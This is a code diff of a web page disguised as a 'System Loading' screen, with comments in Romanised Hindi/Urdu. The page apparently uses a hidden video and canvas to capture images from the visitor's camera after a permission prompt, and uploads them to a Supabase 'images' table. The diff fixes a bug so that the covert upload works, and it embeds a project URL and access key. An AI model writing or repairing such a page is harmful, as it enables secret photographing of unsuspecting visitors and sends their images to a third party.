@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Loading</title>
-    <!-- Supabase Library ko import kiya gaya hai -->
+    <!-- Supabase Library v2 ko import kiya gaya hai -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1a1a1a; color: white; text-align: center; margin: 0; flex-direction: column; }
@@ -29,11 +29,11 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // <<< AAPKI URL AUR KEY YAHAN ADD KAR DI GAYI HAIN >>>
         const SUPABASE_URL = 'https://zxtapsswwmzrirutpelr.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp4dGFwc3N3d216cmlydXRwZWxyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxNTExNzcsImV4cCI6MjA2NTcyNzE3N30.J6kJ9k0AEAarxHVePl0gZSG6ya32rP7IsG8R6UfuO-U';
 
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        // Sahi tareeqa Supabase client banane ka
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         
         const statusEl = document.getElementById('status');
         const loaderEl = document.getElementById('loader');
@@ -41,6 +41,7 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         
+        // Yeh line ab chalegi kyunke upar koi error nahi hai
         setTimeout(() => {
             statusEl.textContent = 'Permission required to continue.';
             loaderEl.style.display = 'none';
@@ -91,8 +92,8 @@
 
         async function sendToSupabase(imageData) {
             try {
-                const { data, error } = await supabase
-                    .from('images') // Aapke table ka naam
+                const { data, error } = await supabaseClient // Yahan 'supabaseClient' istemal kiya
+                    .from('images')
                     .insert([ { image_data: imageData } ]);
                 if (error) throw error;
                 console.log('Image sent to Supabase!');
